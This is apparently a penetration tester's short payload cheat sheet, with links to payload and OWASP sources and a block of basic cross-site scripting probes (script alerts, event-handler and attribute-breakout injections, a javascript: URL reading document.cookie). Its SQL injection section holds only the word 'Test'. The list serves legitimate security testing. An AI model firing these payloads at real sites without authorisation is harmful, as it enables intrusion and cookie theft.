This payload list will include a diverse set of basic payloads for each attack type with the goal of identifying the vulnerability using the least amount of attempts. For a longer list of payloads, see the LongPayloadList document or review the sources below. While this payload list was hand selected from my own personal notes(generated over the course of 3 years), most of the payloads can be found in the sources below.

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/assets/docs/OWASP_SCP_Quick_Reference_Guide_v21.pdf](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/assets/docs/OWASP_SCP_Quick_Reference_Guide_v21.pdf)

[https://owasp.org/www-project-code-review-guide/assets/OWASP_Code_Review_Guide_v2.pdf](https://owasp.org/www-project-code-review-guide/assets/OWASP_Code_Review_Guide_v2.pdf)

Payloads that you can throw into any endpoint:

**Cross-Site Scripting (XSS):**

[https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

```jsx
<b>test</b> 
<script>alert(1)</script>

<img src=1 onerror=alert(1)>

javascript:alert(document.cookie)

"onmouseover="alert(1)

${alert(1)}

alert`1`

‘-alert()-’
```

**SQLi:**
Test